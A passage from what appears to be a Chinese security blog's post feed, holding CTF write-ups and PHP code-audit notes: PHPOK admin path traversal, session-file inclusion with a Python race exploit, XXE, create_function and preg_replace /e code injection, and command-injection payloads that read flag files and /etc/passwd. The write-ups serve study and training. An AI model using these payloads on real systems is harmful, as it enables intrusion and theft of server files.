Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7Cookie: PHPSESSION=ilc9ev2s0fv8rn9hckfh07hni3; XDEBUG_SESSION=PHPSTORMConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 0 后台文件重命名这种漏洞只能和其他洞打组合拳利用才能玩 framework/admin/tpl_control.php 182行： 跟进215行：$this-&gt;lib(&#39;file&#39;)-&gt;mv($file,$newfile); framework/libs/file.php 269行： 利用条件比较多，得知道文件名，其次想拿shell的话，得想办法写入自己的shell,比如想办法写到缓存里或者其他的，然后把原本不能当php解析的改成php扩展名等等.. 后台列目录framework/admin/appsys_control.php 358行 filelist_f() $tpl_list = $this-&gt;lib(&#39;file&#39;)-&gt;ls($tpl_dir); 388行 跟进： 至于id传入啥参数，可以根据这个$rs = $this-&gt;model(&#39;tpl&#39;)-&gt;get_one($id);根据路由跟进到：framework/model/appsys.php 117行：id对应着_app目录下的文件名 exp：1234567891011121314GET /admin.php?c=appsys&amp;f=filelist&amp;id=fav&amp;folder=../../../../ HTTP/1.1Host: phpokUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.8d Safari/537.36content-type: application/jsonAccept: application/json, text/javascript, */*; q=0.01PHPSESSION: ilc9ev2s0fv8rn9hckfh07hni3X-Requested-With: XMLHttpRequestrequest_type: ajaxphpok_ajax: 1Referer: https://phpok/index.php?id=news&amp;cate=companyAccept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7Cookie: PHPSESSION=ilc9ev2s0fv8rn9hckfh07hni3Connection: close 背锅的file文件：framework/libs/file.php… 能力有限,只能挖出这么些鸡肋洞，希望各位师傅多多指点~]]></content>
      <tags>
        <tag>Web</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php反序列化原生类利用]]></title>
    <url>%2F2019%2F03%2F05%2Fphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8%2F</url>
    <content type="text"><![CDATA[梳理和总结了一下最近学的东西~ 触发phar无unserialize()反序列化利用条件： 一个上传点 一个可控的文件操作函数：1fileatime、filectime、file_exists、file_get_contents、file_put_contents、file、filegroup、fopen、fileinode、filemtime、fileowner、fileperms、is_dir、is_executable、is_file、is_link、is_readable、is_writable、is_writeable、parse_ini_file、copy、unlink、stat、readfile、md5_file、filesize Hpdoger师傅的四个实例递进php反序列化漏洞理解Blackhat议题解读 | phar反序列化 session反序列化利用条件： session解析引擎可控(在同一网站能同时出现两种不同的session配置方式) $_SESSION值可控 修改session存储方式可以通过session_start()函数，给其传入serialize_handler=php_serialize参数即可。具体见：LCTF 2018 Babyphp’s revenge php原生类利用Soapclient利用条件： 需要有soap扩展 需要有一个能实例化对象的点 需要调用一个不存在的方法触发其__call()函数 参考：LCTF 2018 Babyphp’s revenge 危害：盲打SSRF:可以结合Soapclient自身的CRLF漏洞，带上各种heade头参数。 参考: 反序列化之PHP原生类的利用 GlobIterator利用条件： 有实例化对象的点即可 危害：列目录 参考：PHP SECURITY CALENDAR 2017-Day 3 - Snow Flake SimpleXMLElement利用条件： xmllib库为存在漏洞的版本 有实例化对象的点即可 危害： 任意文件读取 SSRF 盲打xxe姿势见参考链接 参考：PHP SECURITY CALENDAR 2017-Day 3 - Snow Flake 参考：XML外部实体注入小结]]></content>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件包含小结]]></title>
    <url>%2F2019%2F03%2F05%2F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%B0%8F%E7%BB%93%2F</url>
    <content type="text"><![CDATA[梳理和总结了一下最近学的东西~ 包含SESSION文件p师傅小密圈里学到了一种文件包含getshell的利用思路：文件包含漏洞在找不到可包含的文件，可以包含session文件从而getshell。 默认情况下，session.use_strict_mode值是0。此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID=zsxqzsxq，PHP将会在服务器上创建一个文件：/tmp/sess_zsxqzsxq 在phpmyadmin 4.8.1 文件包含漏洞（CVE-2018-12613）中利用了这个思路从文件包含到getshell 该技巧利用条件：服务器上需要已经初始化Session 通用的初始化方法：session_start() p师傅在小密圈解读phpinfo学到了其他的初始化session思路：https://t.zsxq.com/2nQbAYr 配置项：session.auto_start如果开启这个选项，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。但默认情况下，也是通常情况下，这个选项都是关闭的。 配置项：session.upload_progress最初是PHP为上传进度条设计的一个功能，在上传文件较大的情况下，PHP将进行流式上传，并将进度信息放在Session中（包含用户可控的值），即使此时用户没有初始化Session，PHP也会自动初始化Session。默认情况下session.upload_progress.enabled是为On的。 所以可以利用这点我们可以构造如下数据包123456789101112131415161718192021222324252627282930POST /test.php HTTP/1.1Host: 127.0.0.1Content-Length: 436Cache-Control: max-age=0Origin: https://127.0.0.1Upgrade-Insecure-Requests: 1Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryetzSsuG4Wg73Ob9RUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.9d Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Referer: https://127.0.0.1/Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7Cookie: PHPSESSID=passer6yConnection: close------WebKitFormBoundaryetzSsuG4Wg73Ob9RContent-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;Content-Type: text/plain aaaa------WebKitFormBoundaryetzSsuG4Wg73Ob9RContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;flag.txt&quot;Content-Type: text/plain flag------WebKitFormBoundaryetzSsuG4Wg73Ob9RContent-Disposition: form-data; name=&quot;submit&quot;Submit------WebKitFormBoundaryetzSsuG4Wg73Ob9R-- 从上图看到，我们创建了一个名为sess_passer6y,但是文件内容大小是0，因为上传结束后，这个Session将会被自动清除（由session.upload_progress.cleanup定义），我们只需要条件竞争，赶在文件被清除前利用即可。 所以，只要存在一个文件包含漏洞,我们就可以利用这些默认的特性来Getshell： 复现环境：php 7.0.21 index.php1234&lt;?php if (isset($_GET[&apos;file&apos;])) &#123; include &apos;./&apos; . $_GET[&apos;file&apos;]; &#125; 构造以下两个数据包，发送到爆破模块，null payload爆破即可 不可取.. 这种方法会造成大量session临时文件 还是用p师傅给的exp吧：123456789101112131415161718192021222324252627282930import ioimport requestsimport threadingsessid = &apos;passer6y&apos;def t1(session): while True: f = io.BytesIO(b&apos;a&apos; * 1024 * 50) response = session.post( &apos;https://localhost/test.php&apos;, data=&#123;&apos;PHP_SESSION_UPLOAD_PROGRESS&apos;: &apos;&lt;?=phpinfo()?&gt;&apos;&#125;, files=&#123;&apos;file&apos;: (&apos;a.txt&apos;, f)&#125;, cookies=&#123;&apos;PHPSESSID&apos;: sessid&#125; )def t2(session): while True: response = session.get(f&apos;https://127.0.0.1/index.php?file=../../../../../../../../tmp/sess_&#123;sessid&#125;&apos;) print(response.text)with requests.session() as session: t1 = threading.Thread(target=t1, args=(session, )) t1.daemon = True t1.start() t2(session) 参考：phpmyadmin 4.8.1 文件包含漏洞 配合phpinfo,包含上传临时文件参考笔记： https://app.yinxiang.com/shard/s17/sh/e1cdae4e-d4c3-4595-8bfb-03eff04c4cdb/6b917c87b16133fbcbd60070b579ef2f 包含日志参考笔记： https://app.yinxiang.com/shard/s17/sh/e1cdae4e-d4c3-4595-8bfb-03eff04c4cdb/6b917c87b16133fbcbd60070b579ef2f 自包含漏洞参考笔记： https://app.yinxiang.com/shard/s17/sh/e1cdae4e-d4c3-4595-8bfb-03eff04c4cdb/6b917c87b16133fbcbd60070b579ef2f 参考文章：https://www.anquanke.com/post/id/153376]]></content>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Code-Breaking Write Up]]></title>
    <url>%2F2019%2F03%2F03%2FCode-Breaking%20Write%20Up%2F</url>
    <content type="text"><![CDATA[functionsource:123456789101112&lt;?php$action = $_GET[&apos;action&apos;] ?? &apos;&apos;;$arg = $_GET[&apos;arg&apos;] ?? &apos;&apos;;//D 如果使用$限制结尾字符,则不允许结尾有换行; //i 不区分(ignore)大小写；//s 特殊字符圆点 . 中包含换行符if(preg_match(&apos;/^[a-z0-9_]*$/isD&apos;, $action)) &#123; show_source(__FILE__);&#125; else &#123; $action(&apos;&apos;, $arg);&#125; 可以使用create_function(),用法：https://php.net/manual/zh/function.create-function.php 即第一个为参数新建函数的参数，第二个参数为代码。 create_function(&#39;&#39;,&#39;$GET_[&#39;fname&#39;]&#39;) 等价于 function f() { $GET_[&#39;fname&#39;]; } 于是传入参数为 1;}phpinfo();/*即 function f(){1;}phpinfo();/*} 这里$action还需要绕一下正则，使用\绕过，\func()表示调用全局空间的函数，如果直接写函数名fun()调用，调用的时候其实相当于写了一个相对路径，而用\func()，即使用的是绝对路径。 拿到phpinfo(): ?action=\create_function&amp;arg=1;}phpinfo();/* 列文件：?action=\create_function&amp;arg=1;}var_dump(scandir(&#39;/var/www&#39;));/* 读flag： action=\create_function&amp;arg=1;}var_dump(file_get_contents(&quot;../flag_h0w2execute_arb1trary_c0de&quot;));/* 持续更新ing]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[35C3-POST WriteUp]]></title>
    <url>%2F2019%2F02%2F18%2F35C3-POST%20WriteUp%2F</url>
    <content type="text"><![CDATA[题目&amp;wp链接：https://github.com/eboda/35c3/tree/master/post 35C3-POSThint: flag is in dbHint2: the lovely XSS is part of the beautiful design and insignificant for the challengeHint3: You probably want to get the source code, luckily for you it’s rather hard to configure nginx correctly. 功能点很简单，注册，登录，上传文件，评论。 测试了&lt; &gt;被实体编码，上传php文件不解析。 提示xss无用，nginx配置有问题，在Vulhub中提到了常见的nginx配置问题。 结合提示中的源码泄露，这里尝试nginx的alias配置不当导致目录穿越漏洞。整个过程就一个uploads目录,构造payload:https://50.3.232.201:8000/uploads../ 得到一个default.backup:123456789101112131415161718192021222324252627282930313233343536373839404142434445server &#123; listen 80; access_log /var/log/nginx/example.log; server_name localhost; root /var/www/html; location /uploads &#123; autoindex on; alias /var/www/uploads/; &#125; location / &#123; alias /var/www/html/; index index.php; location ~ \.php$ &#123; include snippets/fastcgi-php.conf; fastcgi_pass unix:/run/php/php7.2-fpm.sock; &#125; &#125; location /inc/ &#123; deny all; # 禁止直接访问 &#125;&#125;server &#123; listen 127.0.0.1:8080; access_log /var/log/nginx/proxy.log; if ( $request_method !~ ^(GET)$ ) &#123; return 405; &#125; root /var/www/miniProxy; location / &#123; index index.php; location ~ \.php$ &#123; include snippets/fastcgi-php.conf; fastcgi_pass unix:/run/php/php7.2-fpm.sock; &#125; &#125;&#125; 说明8080端口还有另一个服务，即在/var/www/miniProxy目录下，直接访问https://50.3.232.201:8000/uploads../miniProxy/可以直接下载php源码，不会解析，这个页面的功能大概就是web的proxy。 此外，通过目录穿越可以下载到全部php源码。 源码基本浏览了一遍，加上提示，我们要拿到数据库里面的flag，在db.php的38行出中有一处反序列化操作unserialize()：而该函数的功能是将从数据库取出的数据进行反序列化操作，db.php的52行： 所以我们要想控制这个unserialize()函数，就得先往数据库里面插入我们的数据，55行: 全局搜索insert操作，共两处，一处注册，一处提交post数据。 post.php的41行： 全局搜索save()函数，在default.php的19行： save()函数中insert()，在db.php中的55行 再跟进DB::prepare_params()，db.php的18行: 这里中途对array_map()没理解好，卡了很久:https://php.net/manual/en/function.array-map.php 到这里，我们要传入一个$serializedobject$开头的字符串，才能使得查库操作时触发我们的unserialize()，但insert的时候过滤了这个字符串前缀，在官方的wp中提到，我们可以使用全角符号的unicode字符，mssql会自动转换，以$符号存入数据库中。 这里0xEF 0xBC 0x84会被mssql存储为$ 下面构造反序列化的攻击链：首先default.php 73行调用了post.php的63行,使用了query函数查询 同时在post.php中的Attachment类 控制$za属性传入soapClient类，使之在上图19行调用了open()方法，因为不存在，所以触发soapClient的__call方法(这里猜想有soap服务，另一个8080端口的服务暗示我们了ssrf，加上这里unserialize的利用功能点少) payload: $用brup的hex修改 8080端口服务只允许get型数据，但是从其服务中来看我们要用post型去打内网数据库，所以这里就利用soapclient的clrf发起get请求，gopher模拟post]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP SECURITY CALENDAR 2017]]></title>
    <url>%2F2019%2F02%2F14%2FPHP%20SECURITY%20CALENDAR%202017%2F</url>
    <content type="text"><![CDATA[Day 1 - Wish List考点：in_array()未配置第三个参数，导致弱类型绕过题目源码：123456789101112131415161718192021class Challenge &#123; const UPLOAD_DIRECTORY = &apos;./solutions/&apos;; private $file; private $whitelist; public function __construct($file) &#123; $this-&gt;file = $file; $this-&gt;whitelist = range(1, 24); &#125; public function __destruct() &#123; if (in_array($this-&gt;file[&apos;name&apos;], $this-&gt;whitelist)) &#123; move_uploaded_file( $this-&gt;file[&apos;tmp_name&apos;], self::UPLOAD_DIRECTORY . $this-&gt;file[&apos;name&apos;] ); &#125; &#125;&#125;$challenge = new Challenge($_FILES[&apos;solution&apos;]); 大致的逻辑为上传一个表单name=solution的文件，验证其文件名在range(1,24)的范围，使用的in_array()来进行验证。 问题就出在in_array()函数：https://php.net/manual/zh/function.in-array.php 文档中写道，如果没有使用第三个参数$strick=true，则使用弱类型比较，即前先进行类型转换再比较。即我们构造一个文件名为1a.php,经过in_array()的类型转换会变成1从而绕过这个限制。 demo:123456&lt;?php$array = range(1,24);$file_name = &quot;1a.php&quot;;if(in_array($file_name, $array))&#123; var_dump(in_array($file_name, $array));&#125; 红日安全提供的一道练习题：https://xz.aliyun.com/t/2451这里用make_set函数绕group，然后报错注入。 没过滤sleep，if，mid盲注也行 Day 2 - Twig考点：filter_var的url验证绕过题目源码：123456789101112131415161718192021222324252627282930313233// composer require &quot;twig/twig&quot;require &apos;vendor/autoload.php&apos;;class Template &#123; private $twig; public function __construct() &#123; $indexTemplate = &apos;&lt;img &apos; . &apos;src=&quot;https://loremflickr.com/320/240&quot;&gt;&apos; . &apos;&lt;a href=&quot;&#123;&#123;link|escape&#125;&#125;&quot;&gt;Next slide &amp;raquo;&lt;/a&gt;&apos;; // Default twig setup, simulate loading // index.html file from disk $loader = new Twig\Loader\ArrayLoader([ &apos;index.html&apos; =&gt; $indexTemplate ]); $this-&gt;twig = new Twig\Environment($loader); &#125; public function getNexSlideUrl() &#123; $nextSlide = $_GET[&apos;nextSlide&apos;]; return filter_var($nextSlide, FILTER_VALIDATE_URL); &#125; public function render() &#123; echo $this-&gt;twig-&gt;render( &apos;index.html&apos;, [&apos;link&apos; =&gt; $this-&gt;getNexSlideUrl()] ); &#125;&#125;(new Template())-&gt;render(); 两个过滤点，一个是twig模板引擎自带的escape过滤：https://twig.symfony.com/ 也就是htmlspecialchars实现的过滤。12345&amp; (&amp; 符号) =============== &amp;amp;&quot; (双引号) =============== &amp;quot;&apos; (单引号) =============== &amp;apos;&lt; (小于号) =============== &amp;lt;&gt; (大于号) =============== &amp;gt; 第二个点：filter_var($nextSlide, FILTER_VALIDATE_URL)，检测是否为一个合法的url。 这里给出的payload：?url=javascript://comment％250aalert(1)即%25-&gt;%,%0a-&gt;换行符，二次url编码，第一次为传入时浏览器接码一次，第二次为解析时，浏览器解码换行符。所以JavaScript伪协议和换行绕过了这个限制。 红日安全提供的一个练习题：https://xz.aliyun.com/t/2491显然这里不是考察orange的parse_url函数和curl处理host的差异，这里要求我们parse_url处理后的host以规定的域名结尾，所以我们可控的就是前面， 这里测试的php版本为5.5： 简单测试了一下filter_var的url合法检测情况(爆破的时候记得将brup的自动url编码关掉) 其实这里漏了一个%23，没有#锚点的特殊功能，单纯只是一个字符#url=https://demo.com%23sec-redclub.com 还有换成别的协议还能用分号绕过,这一步在命令执行里面很关键：?url=demo://demo.com;sec-redclub.com 再来看看着如何绕过第二步parse_url($url)[&#39;host&#39;]的正则匹配：url=demo://demo.com;ls;sec-redclub.com 进一步构造： payload:?url=demo://aa&quot;;ls;&quot;sec-redclub.com 读flag：?url=demo://aa&quot;;cat${IFS}f1agi3hEre.php;&quot;sec-redclub.com Day 3 - Snow Flake题目源码：12345678910111213141516171819202122232425262728293031function __autoload($className) &#123; include $className;&#125;$controllerName = $_GET[&apos;c&apos;];$data = $_GET[&apos;d&apos;];if (class_exists($controllerName)) &#123; $controller = new $controllerName($data[&apos;t&apos;], $data[&apos;v&apos;]); $controller-&gt;render();&#125; else &#123; echo &apos;There is no page with this name&apos;;&#125;class HomeController &#123; private $template; private $variables; public function __construct($template, $variables) &#123; $this-&gt;template = $template; $this-&gt;variables = $variables; &#125; public function render() &#123; if ($this-&gt;variables[&apos;new&apos;]) &#123; echo &apos;controller rendering new response&apos;; &#125; else &#123; echo &apos;controller rendering old response&apos;; &#125; &#125;&#125; 初看源码其实并不知道哪有漏洞，可控的点操作的东西小很少，而且也没有输出的地方。 可以看到文档中写到class_exists()的用法：https://php.net/manual/zh/function.class-exists.php 默认是类不存在时调用__autoload()函数的 文档中写到，__autoload()在php7.2已经废弃，取而代之的是spl_autoload_register() 还有一些会自动调用__autoload()函数的函数1234567891011121314151617call_user_func()call_user_func_array()class_exists()class_implements()class_parents()class_uses()get_class_methods()get_class_vars()get_parent_class()interface_exists()is_a()is_callable()is_subclass_of()method_exists()property_exists()spl_autoload_call()trait_exists() 然而的是PHP5~5.3才能用.符号，在php5.4修复了这个问题，所以既不能目录穿越，也不能 包含当前目录下的.php等文件。 第二个漏洞产生的原因就是因为类名和其实例化传入的参数可控，导致我们可以控制php内部存在漏洞的类。 exp demo:12345678910111213141516&lt;?php# 让php允许外部实体libxml_disable_entity_loader(false);$xml = &lt;&lt;&lt;EOF&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;user&gt;&amp;xxe;&lt;/user&gt;EOF;$xml_class = new SimpleXMLElement($xml, LIBXML_NOENT | LIBXML_DTDLOAD);var_dump($xml_class);// LIBXML_NOENT: 将xml实体引用替换成对应的值// LIBXML_DTDLOAD: 加载DOCTYPE中的DTD文件 payload:1/?c=SimpleXMLElement&amp;d[v]=2&amp;d[t]=&lt;%3fxml+version%3d&quot;1.0&quot;%3f&gt;&lt;!DOCTYPE+ANY+[&lt;!ENTITY+xxe+SYSTEM+&quot;php%3a//filter/read%3dconvert.base64-encode/resource%3d/Users/passer6y/Documents/ctf/phpAuditLabs/day3_class_exists/f1agi3hEre.php&quot;&gt;]&gt;&lt;x&gt;%26xxe%3b&lt;/x&gt; 挺疑惑SimpleXMLElement第二个参数给2的原因.. 把结果输出出来了，这里得盲打xxe,这里挖个坑，以后再填。 下面来看一下红日安全提供的审计题：index.php12345678910111213141516171819202122&lt;?phpclass NotFound&#123; function __construct() &#123; die(&apos;404&apos;); &#125;&#125;spl_autoload_register( function ($class)&#123; new NotFound(); &#125;);$classname = isset($_GET[&apos;name&apos;]) ? $_GET[&apos;name&apos;] : null;$param = isset($_GET[&apos;param&apos;]) ? $_GET[&apos;param&apos;] : null;$param2 = isset($_GET[&apos;param2&apos;]) ? $_GET[&apos;param2&apos;] : null;if(class_exists($classname))&#123; $newclass = new $classname($param,$param2); var_dump($newclass); foreach ($newclass as $key=&gt;$value) echo $key.&apos;=&gt;&apos;.$value.&apos;&lt;br&gt;&apos;;&#125; 这里使用的是spl_autoload_register()函数，简而言之是__autoload()的升级版，给autoload创建一个队列，逐个执行。参数如下： 解题思路：先使用内置类:GlobIterator,其构造函数用法：这样就可以搜索文件位置： 找flag位置：name=GlobIterator&amp;param=*.php&amp;param2=0 这里读取flag要使用php文件流的原因是因为xxe读取的文件中如果存在&lt;&gt;&#39;&quot;&amp;就会导致xml文件解析错误，所以就只能这样通过流的方式base64编码读出。 读flag：1name=SimpleXMLElement&amp;param2=2&amp;param=&lt;%3fxml+version%3d&quot;1.0&quot;%3f&gt;&lt;!DOCTYPE+ANY+[&lt;!ENTITY+xxe+SYSTEM+&quot;php%3a//filter/read%3dconvert.base64-encode/resource%3d/Users/passer6y/Documents/ctf/phpAuditLabs/day3_class_exists/f1agi3hEre.php&quot;&gt;]&gt;&lt;x&gt;%26xxe%3b&lt;/x&gt; Day 4 - False Beard123456789101112131415161718192021class Login &#123; public function __construct($user, $pass) &#123; $this-&gt;loginViaXml($user, $pass); &#125; public function loginViaXml($user, $pass) &#123; if ( (!strpos($user, &apos;&lt;&apos;) || !strpos($user, &apos;&gt;&apos;)) &amp;&amp; (!strpos($pass, &apos;&lt;&apos;) || !strpos($pass, &apos;&gt;&apos;)) ) &#123; $format = &apos;&lt;?xml version=&quot;1.0&quot;?&gt;&apos; . &apos;&lt;user v=&quot;%s&quot;/&gt;&lt;pass v=&quot;%s&quot;/&gt;&apos;; $xml = sprintf($format, $user, $pass); $xmlElement = new SimpleXMLElement($xml); // Perform the actual login. $this-&gt;login($xmlElement); &#125; &#125;&#125;new Login($_POST[&apos;username&apos;], $_POST[&apos;password&apos;]); 去翻一下strpos的文档，里面也明确说明了这个问题，该函数返回查询字符首次出现的数字位置，如果在第一个字符位置则返回0，如果使用弱类型比较，则可能导致安全漏洞。 红日安全提供的练习题，在api.php将用户的每一位数字和开奖的数字进行比较，相同位数越多则得到的奖金越多。 使用的弱类型比较，如果从布尔型的角度想来，除了0,false,null其他都为真，则我们构造一个数组使其都为真即可： Day 5 - postcard12345678910111213141516171819202122232425262728293031323334353637class Mailer &#123; private function sanitize($email) &#123; if (!filter_var($email, FILTER_VALIDATE_EMAIL)) &#123; return &apos;&apos;; &#125; return escapeshellarg($email); &#125; public function send($data) &#123; if (!isset($data[&apos;to&apos;])) &#123; $data[&apos;to&apos;] = &apos;none@ripstech.com&apos;; &#125; else &#123; $data[&apos;to&apos;] = $this-&gt;sanitize($data[&apos;to&apos;]); &#125; if (!isset($data[&apos;from&apos;])) &#123; $data[&apos;from&apos;] = &apos;none@ripstech.com&apos;; &#125; else &#123; $data[&apos;from&apos;] = $this-&gt;sanitize($data[&apos;from&apos;]); &#125; if (!isset($data[&apos;subject&apos;])) &#123; $data[&apos;subject&apos;] = &apos;No Subject&apos;; &#125; if (!isset($data[&apos;message&apos;])) &#123; $data[&apos;message&apos;] = &apos;&apos;; &#125; mail($data[&apos;to&apos;], $data[&apos;subject&apos;], $data[&apos;message&apos;], &apos;&apos;, &quot;-f&quot; . $data[&apos;from&apos;]); &#125;&#125;$mailer = new Mailer();$mailer-&gt;send($_POST); Day6 - Forst Pattern123456789101112131415161718192021222324252627class TokenStorage &#123; public function performAction($action, $data) &#123; switch ($action) &#123; case &apos;create&apos;: $this-&gt;createToken($data); break; case &apos;delete&apos;: $this-&gt;clearToken($data); break; default: throw new Exception(&apos;Unknown action&apos;); &#125; &#125; public function createToken($seed) &#123; $token = md5($seed); file_put_contents(&apos;/tmp/tokens/&apos; . $token, &apos;...data&apos;); &#125; public function clearToken($token) &#123; $file = preg_replace(&quot;/[^a-z.-_]/&quot;, &quot;&quot;, $token); unlink(&apos;/tmp/tokens/&apos; . $file); &#125;&#125;$storage = new TokenStorage();$storage-&gt;performAction($_GET[&apos;action&apos;], $_GET[&apos;data&apos;]); 关键点在preg_replace(&quot;/[^a-z.-_]/&quot;, &quot;&quot;, $token);将非从a-z,.-_替换为空，过滤不严，导致可以使用../../导致任意文件删除。 红日的练习题wp：1234567891011121314151617181920212223242526272829303132333435363738&lt;?phpinclude &apos;flag.php&apos;;if (&quot;POST&quot; == $_SERVER[&apos;REQUEST_METHOD&apos;])&#123; $password = $_POST[&apos;password&apos;]; if (0 &gt;= preg_match(&apos;/^[[:graph:]]&#123;12,&#125;$/&apos;, $password)) // [[:graph:]] ：匹配所有的可打印字符，等价于[^ \t\n\r\f\v] &#123; echo &apos;Wrong Format&apos;; exit; &#125; while (TRUE) &#123; $reg = &apos;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&apos;; // 小写 大写 标点 数字 if (6 &gt; preg_match_all($reg, $password, $arr))&#123; echo &quot;step2:&quot;.preg_match_all($reg, $password, $arr); break; &#125; $c = 0; $ps = array(&apos;punct&apos;, &apos;digit&apos;, &apos;upper&apos;, &apos;lower&apos;); foreach ($ps as $pt) &#123; if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password)) $c += 1; &#125; if ($c &lt; 3)&#123; echo &quot;step3:&quot;.$c; break; &#125; if (&quot;42&quot; == $password) echo $flag; else echo &apos;Wrong password&apos;; exit; &#125;&#125;highlight_file(__FILE__);?&gt; 使用科学计数法绕：payload：12password=42.00e%2b00000000000 password=420.000000e-1 加号注意要url编码，不然是空白字符，在burp的params中可以看到不编码的参数： Day 7 - Bell考察的parse_str没有配置第二个参数导致变量覆盖。123456789101112131415161718192021222324&lt;?phpfunction getUser($id) &#123;global $config, $db;if (!is_resource($db)) &#123; $db = new MySQLi( $config[&apos;dbhost&apos;], $config[&apos;dbuser&apos;], $config[&apos;dbpass&apos;], $config[&apos;dbname&apos;] );&#125;$sql = &quot;SELECT username FROM users WHERE id = ?&quot;;$stmt = $db-&gt;prepare($sql);$stmt-&gt;bind_param(&apos;i&apos;, $id);$stmt-&gt;bind_result($name);$stmt-&gt;execute();$stmt-&gt;fetch();return $name;&#125;$var = parse_url($_SERVER[&apos;HTTP_REFERER&apos;]);parse_str($var[&apos;query&apos;]);$currentUser = getUser($id);echo &apos;&lt;h1&gt;&apos;.htmlspecialchars($currentUser).&apos;&lt;/h1&gt;&apos;; 漏洞点在parse_str($var[&#39;query&#39;]);，其变量覆盖导致可以被修改mysql数据库配置，让其连上我们的数据库然后绕过权限验证。 漏洞产生的原因为没有设置第二个参数，即将结果存入result，而是直接将变量解析到当前作用域 demo： 同样产生变量覆盖的问题还有：$$产生变量覆盖 1234567&lt;?php$a = 1;$k = $_GET[&apos;k&apos;];$v = $_GET[&apos;v&apos;];$$k = $v;echo $a;// 修复办法即注册变量前检测是否变量已存在 以及extract() 12345&lt;?php$a = 1;extract(array(&quot;a&quot;=&gt;&quot;3&quot;));//修复：extract(array(&quot;a&quot;=&gt;&quot;3&quot;),EXTR_SKIP);echo $a; 红日安全提供的练习题：https://xz.aliyun.com/t/2541 第一关parse_str变量覆盖，弱类型比较绕过 第二关条件竞争，利用0.1秒时间差，一个疯狂生成文件，一个调大线程去访问即可。 其实测试了一下这里不加usleep函数也能成功拿到flag，只是概率小了一些而已 Day 8 - Candle考察：preg_replace()e修饰符代码执行1234567891011121314&lt;?phpheader(&quot;Content-Type: text/plain&quot;);function complexStrtolower($regex, $value) &#123; return preg_replace( &apos;/(&apos; . $regex . &apos;)/ei&apos;, &apos;strtolower(&quot;\\1&quot;)&apos;, $value );&#125;foreach ($_GET as $regex =&gt; $value) &#123; echo complexStrtolower($regex, $value) . &quot;\n&quot;;&#125; preg_replace()e修饰符，第二个参数可造成代码执行这里由于第二个参数用的双引号，可导致{${phpinfo()}}该特殊的可变变量被执行。 正则的反向引用：https://xz.aliyun.com/t/2557 关于反向引用的理解：https://blog.csdn.net/lxcnn/article/details/4146148https://blog.csdn.net/lxcnn/article/details/4476746 payload：https://127.0.0.1/?\S*={${phpinfo()}} Day 9 - Rabbit考察str_replace()过滤不严123456789101112131415161718class LanguageManager &#123; public function loadLanguage() &#123; $lang = $this-&gt;getBrowserLanguage(); $sanitizedLang = $this-&gt;sanitizeLanguage($lang); require_once(&quot;/lang/$sanitizedLang&quot;); &#125; private function getBrowserLanguage() &#123; $lang = $_SERVER[&apos;HTTP_ACCEPT_LANGUAGE&apos;] ?? &apos;en&apos;; return $lang; &#125; private function sanitizeLanguage($language) &#123; return str_replace(&apos;../&apos;, &apos;&apos;, $language); &#125;&#125;(new LanguageManager())-&gt;loadLanguage(); payload：..././或....// 如果过滤方式为:str_replace(array(&#39;../&#39;,&#39;./&#39;), &#39;&#39;, $dir);我们可以构造这样的payload：.....///=&gt;../来进行目录遍历 修复方案：可以使用递归的过滤，或者：str_replace(&#39;..&#39;, &#39;&#39;, $language) 红日安全提供的ctf题目：https://xz.aliyun.com/t/2633利用变量覆盖绕过addslashes的引号限制从而导致注入： Day 10 - Anticipation1234567891011121314151617&lt;?phpextract($_POST);function goAway() &#123; error_log(&quot;Hacking attempt.&quot;); header(&apos;Location: /error/&apos;);&#125;if (!isset($pi) || !is_numeric($pi)) &#123; goAway();&#125;if (!assert(&quot;(int)$pi == 3&quot;)) &#123; echo &quot;This is not pi.&quot;;&#125; else &#123; echo &quot;This might be pi.&quot;;&#125; 程序未exit()，加上变量覆盖导致代码执行。payload:pi=phpinfo() Day 12 - String Lights1234567891011121314$sanitized = [];foreach ($_GET as $key =&gt; $value) &#123; $sanitized[$key] = intval($value);&#125;$queryParts = array_map(function ($key, $value) &#123; return $key . &apos;=&apos; . $value;&#125;, array_keys($sanitized), array_values($sanitized));$query = implode(&apos;&amp;&apos;, $queryParts);echo &quot;&lt;a href=&apos;/images/size.php?&quot; . htmlentities($query) . &quot;&apos;&gt;link&lt;/a&gt;&quot;; htmlentities函数使用不当，加上intval只对数组的值进行转换，没有对键进行转换，导致xss。 htmlentities：功能即编码一些特殊符号 